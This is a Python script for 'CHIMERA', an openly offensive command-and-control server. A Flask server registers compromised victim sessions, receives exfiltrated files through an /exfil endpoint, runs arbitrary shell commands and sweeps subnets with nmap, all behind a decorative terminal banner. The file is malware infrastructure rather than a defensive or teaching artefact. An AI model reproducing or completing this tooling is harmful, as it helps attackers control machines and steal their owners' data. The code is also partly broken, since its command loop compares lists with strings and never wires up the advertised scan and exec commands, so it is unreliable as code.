import os
import sys
import json
import threading
import subprocess
import socket
# REMOVED CV2 IMPORT FOR TERMUX COMPATIBILITY
# import cv2 

import nmap
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from colorama import init, Fore, Style
import pyfiglet
import time # Added missing import

# =============== CONFIGURATION ===============
init()  # Initialize Colorama

CHIMERA_CONFIG = {
    "C2_HOST": "0.0.0.0",
    "C2_PORT": 5000,
    "DATA_DIR": "./chimera_exfil/",
    "SHERLOCK_PATH": "./sherlock/sherlock.py"
}

os.makedirs(CHIMERA_CONFIG["DATA_DIR"], exist_ok=True)

# =============== BANNER ASSETS (FIXED FOR TERMUX) ===============

def animate_falcon():
    """The flying falcon animation (Text-only for Termux)."""
    os.system('clear')
    print("\n\n")
    
    x = -20
    
    # FIXED: Used Raw strings (r"") to fix the escape sequence warning
    falcon_art = [
        r"          \       /            ",
        r"           \  '  /             ",
        r"         '- .`-'. .-'          ",
        r"      .' .-' . `-. `-.         ",
        r"   .' .-'   .   `-.   `-.      ",
        r"   \   /     \     \     \     ",
        r"    `-/       `     `      `   "
    ]
    
    while x < 80:
        os.system('clear')
        print("\n\n")
        
        # Move down
        for _ in range(8):
            print()
            
        # Print the falcon at position X
        prefix = " " * x
        color = Fore.MAGENTA
        for line in falcon_art:
            # Center the art roughly
            spaces = " " * (10)
            print(f"{spaces}{prefix}{color}{line}{Style.RESET_ALL}")
        
        # Trail effect
        if x > 5:
            trail = " " * (x + 10) + Fore.CYAN + " ~ ~ ~ " + Style.RESET_ALL
            print(trail)
            
        x += 3
        time.sleep(0.08)
    
    time.sleep(0.5)

def print_glowing_banner():
    """The glowing text banner."""
    try:
        banner = pyfiglet.figlet_format("CHIMERA", font="slant")
    except:
        banner = "CHIMERA"
    
    lines = banner.split('\n')
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.GREEN]
    
    print(Fore.RED + "="*70 + Style.RESET_ALL)
    print()
    
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        print(" " + line)  # Shadow
        print(f"    {color}{line}{Style.RESET_ALL}")
    
    print()
    print(Fore.RED + "="*70 + Style.RESET_ALL)
    
    # Developer Tag
    print(f"\n\n    {Fore.YELLOW}{Style.BRIGHT}>>> DEVELOPED BY: CVJ THE CYBER WOLF {Style.RESET_ALL}")
    print(f"    {Fore.CYAN}[*] Boot Sequence Complete. Loading Modules...{Style.RESET_ALL}")
    print()

# =============== CHIMERA CORE LOGIC (Partial - Removed CV2 usage) ===============

class ChimeraModule:
    def __init__(self):
        self.sessions = {}

    # REMOVED THE PEGASUS CAMERA FUNCTION FOR NOW
    # If you want camera features on Android, we need to use "termux-camera-photo" CLI later.
    
    def ghost_execute(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return {"output": result.decode('utf-8')}
        except Exception as e:
            return {"error": str(e)}

    def fing_network_scan(self, subnet):
        nm = nmap.PortScanner()
        nm.scan(hosts=subnet, arguments='-sn')
        hosts = []
        for host in nm.all_hosts():
            hosts.append({
                'ip': host,
                'status': nm[host].state()
            })
        return hosts

# =============== FLASK C2 SERVER ===============

app = Flask(__name__)
chimera = ChimeraModule()

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    session_id = data.get('id')
    chimera.sessions[session_id] = {
        "ip": request.remote_addr,
        "os": data.get('os'),
        "registered": datetime.now().isoformat()
    }
    print(f"{Fore.GREEN}[+] NEW BLOOD: {session_id} from {request.remote_addr}{Style.RESET_ALL}")
    return jsonify({"status": "registered", "session": session_id})

@app.route('/exfil', methods=['POST'])
def receive_data():
    if 'file' in request.files:
        file = request.files['file']
        filepath = os.path.join(CHIMERA_CONFIG["DATA_DIR"], file.filename)
        file.save(filepath)
        print(f"{Fore.CYAN}[+] DATA JACKED: {filepath}{Style.RESET_ALL}")
    return jsonify({"status": "received"})

# =============== CLI INTERFACE ===============

def cli_interface():
    """The main CLI after the banner plays."""
    print(f"\n{Fore.WHITE}CHIMERA C2 Console {Style.RESET_ALL}| Type 'help' to list commands | 'exit' to quit")
    while True:
        try:
            cmd = input(f"\nCHIMERA> ").strip().split()
            if not cmd:
                continue
            
            if cmd == "help":
                print("""
    🛠️  COMMANDS:
      sessions          : List active targets
      scan <subnet>     : Network discovery (Fing)
      exec <id> <cmd>   : Execute shell cmd (Ghost)
      clear             : Clear screen
                """)
            
            elif cmd == "sessions":
                print(json.dumps(chimera.sessions, indent=2))
            
            elif cmd == "clear":
                os.system('clear')
                print(f"{Fore.MAGENTA}CHIMERA C2{Style.RESET_ALL} - Active Sessions:")
            
            elif cmd == "exit":
                print(f"{Fore.RED}[*] Standing down. Stay sharp.{Style.RESET_ALL}")
                sys.exit()
            
            else:
                print(f"[-] Unknown command. Type 'help'.")
                
        except KeyboardInterrupt:
            print("\n\nUse 'exit' to quit.")
        except Exception as e:
            print(f"[-] Error: {e}")

# =============== MAIN FUNCTION ===============

if __name__ == '__main__':
    # --- PLAY THE BANNER FIRST ---
    animate_falcon()
    print_glowing_banner()
    
    # --- START THE C2 SERVER IN BACKGROUND ---
    def run_server():
        app.run(host=CHIMERA_CONFIG["C2_HOST"], port=CHIMERA_CONFIG["C2_PORT"], debug=False, use_reloader=False)
    
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    
    # --- START THE CLI ---
    cli_interface()
